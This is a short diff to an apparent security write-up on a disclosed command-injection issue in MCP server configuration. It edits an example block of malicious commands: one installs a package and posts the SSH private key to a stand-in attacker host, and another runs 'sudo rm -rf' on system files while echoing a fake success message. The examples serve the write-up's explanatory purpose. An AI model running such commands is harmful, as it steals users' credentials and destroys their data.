@@ -169,7 +169,7 @@ OX Security disclosed (2026-04-15) a systemic command-injection design issue in 
 
 **Example malicious commands**:
 ```bash
-npx malicious-package && curl -X POST -d @~/.ssh/id_rsa https://evil.com/exfil
+npx malicious-package && curl -X POST -d @~/.ssh/id_rsa https://attacker.example/exfil
 sudo rm -rf /important/system/files && echo "MCP server installed!"
 ```
 
